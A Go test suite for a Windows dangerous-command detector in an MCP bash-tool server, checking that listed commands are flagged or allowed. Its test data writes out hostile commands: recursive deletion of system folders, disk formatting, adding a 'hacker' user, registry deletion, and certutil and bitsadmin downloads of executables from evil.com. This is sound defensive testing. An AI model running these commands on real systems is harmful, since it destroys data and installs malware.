package main

import (
	"context"
	"testing"

	"mcp-bash-tools/internal/security"

	"github.com/modelcontextprotocol/go-sdk/mcp"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/suite"
)

// SecurityTestSuite Windows安全功能测试套件
type SecurityTestSuite struct {
	suite.Suite
	server *MCPServer
}

// SetupSuite 测试套件初始化
func (suite *SecurityTestSuite) SetupSuite() {
	suite.server = NewMCPServer()
}

// TestDangerousCommandDetection 测试危险命令检测（Windows专用）
// 更新为符合新的宽松黑名单策略
func (suite *SecurityTestSuite) TestDangerousCommandDetection() {
	dangerousCommands := []string{
		"del /f /s /q C:\\Windows",   // 递归强制删除
		"del /s /f C:\\Windows",      // 递归强制删除（参数顺序不同）
		"format C:",                  // 格式化磁盘
		"shutdown /s",                // 关机
		"shutdown /r",                // 重启
		"rd /s /q C:\\Important",     // 递归删除目录
		"rmdir /s /q C:\\Data",       // 递归删除目录
		"diskpart",                   // 磁盘分区工具
		"Stop-Computer",              // PowerShell关机
		"Restart-Computer",           // PowerShell重启
		"net user hacker /add",       // 添加用户
		"reg delete HKLM\\Software",  // 删除注册表
		"powershell -enc base64code", // 编码命令执行
		"certutil -urlcache -f http://evil.com/malware.exe", // 下载恶意文件
		"bitsadmin /transfer job http://evil.com/file.exe",  // 下载文件
	}

	for _, cmd := range dangerousCommands {
		suite.Run("危险命令: "+cmd, func() {
			assert.True(suite.T(), security.IsDangerousCommand(cmd),
				"命令应该被识别为危险: %s", cmd)
		})
	}
}

// TestSafeCommands 测试安全命令
func (suite *SecurityTestSuite) TestSafeCommands() {
	safeCommands := []string{
		"echo Hello World",
		"dir",
		"type file.txt",
		"tasklist",
		"ipconfig",
		"whoami",
		"date",
		"copy source.txt dest.txt",
		"mkdir newdir",
		"ping google.com",
	}

	for _, cmd := range safeCommands {
		suite.Run("安全命令: "+cmd, func() {
			assert.False(suite.T(), security.IsDangerousCommand(cmd),
				"命令不应该被识别为危险: %s", cmd)
		})
	}
}

// TestQuotedCommands 测试引号内的命令
func (suite *SecurityTestSuite) TestQuotedCommands() {
	testCases := []struct {
		cmd         string
		isDangerous bool
	}{
		{`echo "shutdown -s"`, false},
		{`type "format.log"`, false},
		{`echo 'del /s /q'`, false},
	}

	for _, tc := range testCases {
		suite.Run("引号命令: "+tc.cmd, func() {
			if tc.isDangerous {
				assert.True(suite.T(), security.IsDangerousCommand(tc.cmd),
					"命令应该被识别为危险: %s", tc.cmd)
			} else {
				assert.False(suite.T(), security.IsDangerousCommand(tc.cmd),
					"命令不应该被识别为危险: %s", tc.cmd)
			}
		})
	}
}

// TestCaseVariations 测试大小写变化
func (suite *SecurityTestSuite) TestCaseVariations() {
	testCases := []struct {
		cmd         string
		isDangerous bool
	}{
		{"shutdown /s", true},
		{"SHUTDOWN /S", true},
		{"FORMAT C:", true},
		{"format c:", true},
	}

	for _, tc := range testCases {
		suite.Run("大小写: "+tc.cmd, func() {
			assert.Equal(suite.T(), tc.isDangerous, security.IsDangerousCommand(tc.cmd))
		})
	}
}

// TestEdgeCases 测试边界情况
func (suite *SecurityTestSuite) TestEdgeCases() {
	testCases := []struct {
		cmd         string
		isDangerous bool
	}{
		{"", false},
		{"   ", false},
		{"echo", false},
		{"shutdown /s", true},  // 带参数的shutdown是危险的
		{";shutdown /s", true}, // 命令注入
	}

	for _, tc := range testCases {
		suite.Run("边界: "+tc.cmd, func() {
			assert.Equal(suite.T(), tc.isDangerous, security.IsDangerousCommand(tc.cmd))
		})
	}
}

// TestSecurityIntegrationWithBashHandler 测试安全功能与BashHandler的集成
func (suite *SecurityTestSuite) TestSecurityIntegrationWithBashHandler() {
	args := BashArguments{
		Command: "shutdown /s",
		Timeout: 5000,
	}

	_, output, err := suite.server.BashHandler(context.Background(), &mcp.CallToolRequest{}, args)

	suite.Require().Error(err, "应该返回错误")
	suite.Assert().Equal(1, output.ExitCode, "退出代码应该是1")
	suite.Assert().Contains(output.Output, "command rejected for security reasons", "输出应该包含错误信息")
}

// 运行安全测试套件
func TestSecurityTestSuite(t *testing.T) {
	suite.Run(t, new(SecurityTestSuite))
}
